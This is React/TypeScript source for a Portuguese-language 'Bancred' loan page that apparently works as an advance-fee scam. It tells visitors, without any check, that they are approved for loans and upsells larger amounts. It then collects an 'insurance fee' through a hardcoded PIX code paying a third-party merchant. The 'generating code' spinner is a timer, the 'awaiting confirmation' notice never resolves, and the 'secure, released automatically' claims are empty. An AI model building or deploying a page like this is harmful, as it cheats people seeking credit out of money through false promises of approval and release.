import { useEffect, useMemo, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import {
  ShieldCheck,
  Info,
  Clock,
  QrCode,
  Copy,
  Check,
  Loader2,
  X,
  Wallet,
} from "lucide-react";

const fontStack = '"Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif';

const formatBRL = (n: number) =>
  n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

const PixIcon = ({ size = 20 }: { size?: number }) => (
  <svg xmlns="http://www.w3.org/2000/svg" width={size} height={size} viewBox="0 0 315.63 315.63">
    <g transform="translate(-2394 -4352.093)">
      <path d="M246.13,264.53A46.07,46.07,0,0,1,213.35,251L166,203.62a9,9,0,0,0-12.44,0l-47.51,47.51A46.09,46.09,0,0,1,73.27,264.7H64l60,60a48,48,0,0,0,67.81,0l60.12-60.13Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M73.28,97.09a46.08,46.08,0,0,1,32.78,13.57l47.51,47.52a8.81,8.81,0,0,0,12.44,0l47.34-47.34a46,46,0,0,1,32.78-13.58h5.7L191.71,37.14a47.94,47.94,0,0,0-67.81,0L64,97.09Z" transform="translate(2394.023 4329.001)" fill="#32bcad" />
      <path d="M301.56,147l-36.33-36.33a7,7,0,0,1-2.58.52H246.13a32.62,32.62,0,0,0-22.93,9.5L175.86,168a22.74,22.74,0,0,1-32.13,0L96.21,120.51A32.62,32.62,0,0,0,73.28,111H53a7.12,7.12,0,0,1-2.44-.49L14,147a48,48,0,0,0,0,67.81l36.48,36.48a6.85,6.85,0,0,1,2.44-.49H73.28a32.63,32.63,0,0,0,22.93-9.51l47.51-47.51c8.59-8.58,23.56-8.58,32.14,0l47.34,47.33a32.62,32.62,0,0,0,22.93,9.5h16.52a6.9,6.9,0,0,1,2.58.52l36.33-36.33a47.94,47.94,0,0,0,0-67.81" transform="translate(2394.023 4329.001)" fill="#32bcad" />
    </g>
  </svg>
);

const calcSeguro = (valor: number) => {
  // ~0.685% do valor — ajustado para bater com R$ 34,23 em R$ 5.000
  const total = +(valor * 0.006846).toFixed(2);
  const morte = +(total * 0.36).toFixed(2);
  const desemprego = +(total * 0.32).toFixed(2);
  const emergencia = +(total - morte - desemprego).toFixed(2);
  return { total, morte, desemprego, emergencia };
};

const PIX_PAYLOAD =
  "00020101021226800014br.gov.bcb.pix2558qrcode.mkip.com.br/v1/2684c286-628c-4f2d-b1fd-20512cdb336b5204000053039865802BR5915TTKBRASILSEGURO6008SAOPAULO62070503***63044FF2";

const Pagamento = () => {
  const [params] = useSearchParams();
  const navigate = useNavigate();
  const valor = Number(params.get("valor") || 5000);
  const seguro = useMemo(() => calcSeguro(valor), [valor]);

  const [oferta, setOferta] = useState<"principal" | "extra1" | "extra2">("principal");
  const [showPix, setShowPix] = useState(false);
  const [pixLoading, setPixLoading] = useState(true);
  const [copied, setCopied] = useState(false);

  const valorOfertaExtra1 = 7000;
  const valorOfertaExtra2 = 10000;
  const seguroExtra1 = useMemo(() => calcSeguro(valorOfertaExtra1), []);
  const seguroExtra2 = useMemo(() => calcSeguro(valorOfertaExtra2), []);

  const valorAtual =
    oferta === "principal" ? valor : oferta === "extra1" ? valorOfertaExtra1 : valorOfertaExtra2;
  const seguroAtual =
    oferta === "principal" ? seguro : oferta === "extra1" ? seguroExtra1 : seguroExtra2;

  useEffect(() => {
    if (showPix) {
      setPixLoading(true);
      const t = setTimeout(() => setPixLoading(false), 2200);
      return () => clearTimeout(t);
    }
  }, [showPix]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(PIX_PAYLOAD);
      setCopied(true);
      setTimeout(() => setCopied(false), 2200);
    } catch {
      // ignore
    }
  };

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=260x260&margin=0&data=${encodeURIComponent(
    PIX_PAYLOAD
  )}`;

  const OfferCard = ({
    id,
    titulo,
    valorEmp,
    seg,
    destaque,
  }: {
    id: "principal" | "extra1" | "extra2";
    titulo: string;
    valorEmp: number;
    seg: ReturnType<typeof calcSeguro>;
    destaque?: boolean;
  }) => {
    const active = oferta === id;
    return (
      <button
        type="button"
        onClick={() => setOferta(id)}
        style={{
          width: "100%",
          background: "#fff",
          border: `2px solid ${active ? "#1C68E3" : "#E5E7EB"}`,
          borderRadius: 16,
          padding: 16,
          textAlign: "left",
          cursor: "pointer",
          fontFamily: fontStack,
          marginBottom: 12,
          boxShadow: active ? "0 6px 18px -8px rgba(28,104,227,0.35)" : "none",
          transition: "border-color 0.2s",
        }}
      >
        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: 6 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
            <span
              style={{
                width: 18,
                height: 18,
                borderRadius: "50%",
                border: `2px solid ${active ? "#1C68E3" : "#D1D5DB"}`,
                display: "inline-flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
              }}
            >
              {active && <span style={{ width: 8, height: 8, borderRadius: "50%", background: "#1C68E3" }} />}
            </span>
            <span style={{ fontSize: 13, fontWeight: 600, color: "#111827" }}>{titulo}</span>
          </div>
          {destaque && (
            <span style={{ fontSize: 10, fontWeight: 700, color: "#15803D", background: "#DCFCE7", padding: "3px 8px", borderRadius: 999, letterSpacing: 0.3 }}>
              SUA OFERTA
            </span>
          )}
        </div>
        <div style={{ display: "flex", alignItems: "baseline", justifyContent: "space-between", marginTop: 6 }}>
          <div>
            <div style={{ fontSize: 24, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.5 }}>{formatBRL(valorEmp)}</div>
            <div style={{ fontSize: 11, color: "#6B7280", marginTop: 2 }}>Liberação imediata</div>
          </div>
          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 11, color: "#6B7280" }}>Seguro</div>
            <div style={{ fontSize: 18, fontWeight: 800, color: "#16A34A" }}>{formatBRL(seg.total)}</div>
          </div>
        </div>
      </button>
    );
  };

  return (
    <div style={{ minHeight: "100dvh", background: "#F4F4F7", fontFamily: fontStack, color: "#111827", paddingBottom: showPix ? 0 : 32 }}>
      <header style={{ background: "#fff", borderBottom: "1px solid #E5E7EB", padding: "14px 16px", textAlign: "center" }}>
        <span style={{ fontSize: 22, fontWeight: 800, color: "#1C68E3", letterSpacing: -0.4 }}>Bancred</span>
      </header>

      <main style={{ padding: "18px 14px", maxWidth: 480, margin: "0 auto" }}>
        <OfferCard id="principal" titulo="Você aprovado para empréstimo" valorEmp={valor} seg={seguro} destaque />

        <div style={{ background: "#fff", border: "1px solid #E5E7EB", borderRadius: 16, padding: 16, marginBottom: 16 }}>
          <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 12, color: "#1C68E3", fontWeight: 700, fontSize: 14 }}>
            <Info size={16} /> Detalhamento da Tarifa de Seguro
          </div>
          {[
            { l: "Cobertura por morte e invalidez", v: seguroAtual.morte },
            { l: "Proteção contra desemprego", v: seguroAtual.desemprego },
            { l: "Assistência 24h emergencial", v: seguroAtual.emergencia },
          ].map((it) => (
            <div key={it.l} style={{ display: "flex", justifyContent: "space-between", padding: "8px 0", fontSize: 13, color: "#374151", borderBottom: "1px dashed #F3F4F6" }}>
              <span>{it.l}</span>
              <span style={{ fontWeight: 600, color: "#111827" }}>{formatBRL(it.v)}</span>
            </div>
          ))}
          <div style={{ display: "flex", justifyContent: "space-between", paddingTop: 12, marginTop: 6, borderTop: "1px solid #E5E7EB", fontSize: 14, fontWeight: 700 }}>
            <span>Total do seguro</span>
            <span style={{ color: "#16A34A" }}>{formatBRL(seguroAtual.total)}</span>
          </div>
        </div>

        <h2 style={{ fontSize: 15, fontWeight: 700, marginBottom: 12 }}>
          Temos mais 2 ofertas aprovadas pro seu CPF:
        </h2>

        <OfferCard id="extra1" titulo="Oferta turbinada" valorEmp={valorOfertaExtra1} seg={seguroExtra1} />
        <OfferCard id="extra2" titulo="Oferta premium" valorEmp={valorOfertaExtra2} seg={seguroExtra2} />

        <button
          type="button"
          onClick={() => setShowPix(true)}
          style={{
            width: "100%",
            padding: "16px 20px",
            background: "#16A34A",
            color: "#fff",
            border: "none",
            borderRadius: 14,
            fontSize: 16,
            fontWeight: 700,
            cursor: "pointer",
            boxShadow: "0 10px 24px rgba(22,163,74,0.32)",
            display: "inline-flex",
            alignItems: "center",
            justifyContent: "center",
            gap: 10,
            fontFamily: fontStack,
            minHeight: 54,
            marginTop: 8,
          }}
        >
          <PixIcon size={20} /> Pagar {formatBRL(seguroAtual.total)} via PIX
        </button>

        <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, fontSize: 12, color: "#6B7280", marginTop: 14 }}>
          <ShieldCheck size={14} color="#16A34A" /> Pagamento 100% seguro com criptografia
        </div>
      </main>

      {showPix && (
        <div
          style={{
            position: "fixed",
            inset: 0,
            background: "rgba(15,23,42,0.55)",
            backdropFilter: "blur(2px)",
            display: "flex",
            alignItems: "flex-end",
            justifyContent: "center",
            zIndex: 60,
          }}
          onClick={() => setShowPix(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              background: "#fff",
              width: "100%",
              maxWidth: 480,
              borderTopLeftRadius: 22,
              borderTopRightRadius: 22,
              padding: "14px 18px 24px",
              maxHeight: "92dvh",
              overflowY: "auto",
              fontFamily: fontStack,
            }}
          >
            <div style={{ width: 44, height: 4, background: "#E5E7EB", borderRadius: 2, margin: "0 auto 14px" }} />

            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
              <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                <PixIcon size={22} />
                <span style={{ fontSize: 18, fontWeight: 700 }}>Pagar com PIX</span>
              </div>
              <button
                type="button"
                onClick={() => setShowPix(false)}
                aria-label="Fechar"
                style={{ background: "transparent", border: "none", cursor: "pointer", color: "#6B7280" }}
              >
                <X size={22} />
              </button>
            </div>

            <div
              style={{
                background: "#F0FDF4",
                border: "1px solid #DCFCE7",
                borderRadius: 14,
                padding: "12px 14px",
                display: "flex",
                justifyContent: "space-between",
                alignItems: "center",
                marginBottom: 18,
              }}
            >
              <div>
                <div style={{ fontSize: 12, color: "#15803D", fontWeight: 600 }}>Valor a pagar</div>
                <div style={{ fontSize: 24, fontWeight: 800, color: "#16A34A", letterSpacing: -0.4 }}>
                  {formatBRL(seguroAtual.total)}
                </div>
              </div>
              <div
                style={{
                  display: "inline-flex",
                  alignItems: "center",
                  gap: 6,
                  background: "#fff",
                  border: "1px solid #DCFCE7",
                  color: "#15803D",
                  fontSize: 12,
                  fontWeight: 600,
                  padding: "6px 10px",
                  borderRadius: 999,
                }}
              >
                <Clock size={12} /> expira em 15min
              </div>
            </div>

            {pixLoading ? (
              <div style={{ display: "flex", flexDirection: "column", alignItems: "center", padding: "40px 0" }}>
                <Loader2 size={42} color="#1C68E3" style={{ animation: "spin 1s linear infinite" }} />
                <div style={{ marginTop: 18, color: "#6B7280", fontSize: 14 }}>Gerando seu código PIX...</div>
                <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
              </div>
            ) : (
              <>
                <div style={{ fontSize: 13, color: "#374151", lineHeight: 1.6, marginBottom: 14 }}>
                  Abra o app do seu banco e acesse a área PIX.<br />
                  Escolha <strong>Ler QR Code</strong> ou <strong>PIX Copia e Cola</strong>.<br />
                  Confirme o valor e finalize o pagamento.
                </div>

                <div style={{ background: "#F9FAFB", border: "1px solid #E5E7EB", borderRadius: 14, padding: 16, marginBottom: 14 }}>
                  <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 6, color: "#374151", fontSize: 13, fontWeight: 600, marginBottom: 12 }}>
                    <QrCode size={14} /> Escaneie o QR Code
                  </div>
                  <div style={{ display: "flex", justifyContent: "center" }}>
                    <img
                      src={qrUrl}
                      alt="QR Code PIX"
                      width={240}
                      height={240}
                      style={{ display: "block", background: "#fff", padding: 8, borderRadius: 8 }}
                    />
                  </div>
                </div>

                <div style={{ fontSize: 13, fontWeight: 600, color: "#111827", marginBottom: 6 }}>Ou use o PIX Copia e Cola:</div>
                <div
                  style={{
                    background: "#F9FAFB",
                    border: "1px solid #E5E7EB",
                    borderRadius: 12,
                    padding: 12,
                    fontFamily: "ui-monospace, SFMono-Regular, Menlo, monospace",
                    fontSize: 12,
                    color: "#111827",
                    wordBreak: "break-all",
                    lineHeight: 1.5,
                    marginBottom: 12,
                  }}
                >
                  {PIX_PAYLOAD}
                </div>

                <button
                  type="button"
                  onClick={handleCopy}
                  style={{
                    width: "100%",
                    padding: "14px 18px",
                    background: copied ? "#16A34A" : "#1C68E3",
                    color: "#fff",
                    border: "none",
                    borderRadius: 12,
                    fontSize: 15,
                    fontWeight: 700,
                    cursor: "pointer",
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    gap: 8,
                    fontFamily: fontStack,
                    minHeight: 50,
                  }}
                >
                  {copied ? <Check size={18} /> : <Copy size={18} />} {copied ? "Copiado!" : "Copiar código PIX"}
                </button>

                <div
                  style={{
                    marginTop: 12,
                    background: "#EFF6FF",
                    border: "1px solid #DBEAFE",
                    borderRadius: 12,
                    padding: "12px 14px",
                    display: "flex",
                    alignItems: "center",
                    gap: 10,
                    color: "#1751B5",
                    fontSize: 13,
                  }}
                >
                  <Loader2 size={16} style={{ animation: "spin 1.4s linear infinite", flexShrink: 0 }} />
                  Aguardando confirmação do pagamento...
                </div>

                <div style={{ marginTop: 14, fontSize: 11.5, color: "#6B7280", textAlign: "center", lineHeight: 1.55, display: "inline-flex", alignItems: "flex-start", gap: 6 }}>
                  <Wallet size={12} style={{ marginTop: 2, flexShrink: 0 }} />
                  <span>
                    Após o pagamento, o valor é liberado automaticamente. Pagamento processado com criptografia ponta a ponta.
                  </span>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Pagamento;
